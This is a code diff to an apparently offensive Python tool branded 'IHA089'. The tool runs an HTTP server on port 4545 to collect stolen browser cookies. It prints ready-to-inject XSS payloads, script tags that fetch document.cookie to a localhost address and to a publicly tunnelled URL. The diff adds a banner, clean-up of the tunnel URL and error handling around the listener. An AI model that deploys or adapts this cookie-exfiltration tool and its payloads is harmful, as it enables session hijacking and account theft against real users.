@@ -2,6 +2,8 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib.parse
 import publicurl
 import time
+import sys
+import re
 
 class RequestHandler(BaseHTTPRequestHandler):
 
@@ -20,19 +22,45 @@ class RequestHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b"GET request received and logged.")
 
+def strip_ansi_escape_sequences(text):
+    ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
+    return ansi_escape.sub('', text)
+
+def home_logo():
+    print("""
+        ####   ##     ##      ###        #####      #######     #######
+         ##    ##     ##     ## ##      ##   ##    ##     ##   ##     ##
+         ##    ##     ##    ##   ##    ##     ##   ##     ##   ##     ##
+         ##    #########   ##     ##   ##     ##    #######     ########
+         ##    ##     ##   #########   ##     ##   ##     ##          ##
+         ##    ##     ##   ##     ##    ##   ##    ##     ##   ##     ##
+        ####   ##     ##   ##     ##     #####      #######     #######
+
+IHA089: Navigating the Digital Realm with Code and Security - Where Programming Insights Meet Cyber Vigilance.
+    """)
+
 def run(server_class=HTTPServer, handler_class=RequestHandler, port=4545):
     """Run the HTTP server"""
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
+    home_logo()
+    print()
     print("localhost js query ::: \033[31m<script>fetch(`http://127.0.0.1:4545?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
     publicurl.create_public_connection()
     time.sleep(7)
     k = publicurl.get_public_url()
-    k=k.replace(" ","")
-    print("public js query ::: \033[31m<script>fetch(`"+k+"?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
-    print("Server running....")
-    httpd.serve_forever()
+    if k!="0":
+        k=k.replace(" ","")
+        k = strip_ansi_escape_sequences(k).strip()
+        print(f"public js query ::: \033[31m<script>fetch(`"+k+"?cookies=${encodeURIComponent(document.cookie)}`);</script>\033[0m")
+    print("\nServer running....")
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("Exiting....")
+        sys.exit()
+    except Exception as e:
+        print(e)
 
 if __name__ == '__main__':
     run()
-
